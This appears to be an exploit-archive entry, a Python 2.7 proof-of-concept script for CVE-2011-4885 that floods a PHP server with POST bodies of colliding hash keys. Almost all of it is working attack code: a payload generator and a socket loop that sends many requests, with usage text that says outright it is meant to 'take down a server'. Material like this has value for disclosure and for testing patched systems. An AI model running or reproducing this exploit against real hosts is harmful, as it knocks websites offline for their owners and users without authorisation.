@@ -1,0 +1,193 @@
+id: 17327
+date: 01/03/2012
+title: PHP Hash Table Collision Proof Of Concept
+author: Christian Mehlmau.
+cves: 
+
+'''
+This script was written by Christian Mehlmauer <FireFart@gmail.com>
+Original PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
+CVE : CVE-2011-4885
+ 
+requires Python 2.7
+ 
+Examples:
+-) Make a single Request, wait for the response and save the response to output0.html
+python HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output
+ 
+-) Take down a server(make 500 requests without waiting for a response):
+python HashtablePOC.py -u https://host/index.php -v -c 500
+ 
+Changelog:
+v2.0: Added Support for https, switched to HTTP 1.1
+v1.0: Initial Release
+'''
+ 
+import socket
+import sys
+import math
+import urllib
+import string
+import time
+import urlparse
+import argparse
+import ssl
+ 
+def main():
+    parser = argparse.ArgumentParser(description="Take down a remote PHP Host", prog="PHP Hashtable Exploit")
+    parser.add_argument("-u", "--url", dest="url", help="Url to attack", required=True)
+    parser.add_argument("-w", "--wait", dest="wait", action="store_true", default=False, help="wait for Response")
+    parser.add_argument("-c", "--count", dest="count", type=int, default=1, help="How many requests")
+    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output")
+    parser.add_argument("-f", "--file", dest="file", help="Save payload to file")
+    parser.add_argument("-o", "--output", dest="output", help="Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w")
+    parser.add_argument('--version', action='version', version='%(prog)s 2.0')
+ 
+    options = parser.parse_args()
+ 
+    url = urlparse.urlparse(options.url)
+ 
+    if not url.scheme:
+        print("Please provide a scheme to the URL(http://, https://,..")
+        sys.exit(1)
+ 
+    host = url.hostname
+    path = url.path
+    port = url.port
+    if not port:
+        if url.scheme == "https":
+            port = 443
+        elif url.scheme == "http":
+            port = 80
+        else:
+            print("Unsupported Protocol %s" % url.scheme)
+            sys.exit(1)
+    if not path:
+        path = "/"
+ 
+    print("Generating Payload...")
+    payload = generatePayload()
+    print("Payload generated")
+    if options.file:
+        f = open(options.file, 'w')
+        f.write(payload)
+        f.close()
+        print("Payload saved to %s" % options.file)
+    print("Host: %s" % host)
+    print("Port: %s" % str(port))
+    print("path: %s" % path)
+    print
+    print
+ 
+    for i in range(options.count):
+        print("sending Request #%s..." % str(i+1))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if url.scheme == "https":
+            ssl_sock = ssl.wrap_socket(sock)
+            ssl_sock.connect((host, port))
+            ssl_sock.settimeout(None)
+        else:
+            sock.connect((host, port))
+            sock.settimeout(None)
+ 
+        request = """POST %s HTTP/1.1
+Host: %s
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)
+Content-Length: %s
+ 
+%s
+ 
+""" % (path, host, str(len(payload)), payload)
+ 
+        if url.scheme == "https":
+            ssl_sock.send(request)
+        else:
+            sock.send(request)
+ 
+        if options.verbose:
+            if len(request) > 300:
+                print(request[:300]+"....")
+            else:
+                print(request)
+            print
+        if options.wait or options.output:
+            start = time.clock()
+            if url.scheme == "https":
+                data = ssl_sock.recv(1024)
+                string = ""
+                while len(data):
+                    string = string + data
+                    data = ssl_sock.recv(1024)
+            else:
+                data = sock.recv(1024)
+                string = ""
+                while len(data):
+                    string = string + data
+                    data = sock.recv(1024)
+             
+            elapsed = (time.clock() - start)
+            print ("Request %s finished" % str(i+1))
+            print ("Request %s duration: %s" % (str(i+1), elapsed))
+            split = string.partition("\r\n\r\n")
+            header = split[0]
+            content = split[2]
+            if options.verbose:
+                # only print http header
+                print
+                print(header)
+                print
+            if options.output:
+                f = open(options.output+str(i)+".html", 'w')
+                f.write("<!-- "+header+" -->\r\n"+content)
+                f.close()
+ 
+        if url.scheme == "https":
+            ssl_sock.close()
+            sock.close()
+        else:
+            sock.close()
+ 
+def generatePayload():
+    # Taken from:
+    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision
+ 
+    # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
+     
+    # entries with collisions in PHP hashtable hash function
+    a = {'0':'Ez', '1':'FY', '2':'G8', '3':'H'+chr(23), '4':'D'+chr(122+33)}
+    # how long should the payload be
+    length = 7
+    size = len(a)
+    post = ""
+    maxvaluefloat = math.pow(size,length)
+    maxvalueint = int(math.floor(maxvaluefloat))
+    for i in range (maxvalueint):
+        inputstring = base_convert(i, size)
+        result = inputstring.rjust(length, '0')
+        for item in a:
+            result = result.replace(item, a[item])
+        post += '' + urllib.quote(result) + '=&'
+ 
+    return post;
+ 
+def base_convert(num, base):
+    fullalphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    alphabet = fullalphabet[:base]
+    if (num == 0):
+        return alphabet[0]
+    arr = []
+    base = len(alphabet)
+    while num:
+        rem = num % base
+        num = num // base
+        arr.append(alphabet[rem])
+    arr.reverse()
+    return ''.join(arr)
+ 
+if __name__ == "__main__":
+    main()
+
+
+
+#  0day.today [2023-03-24]  #
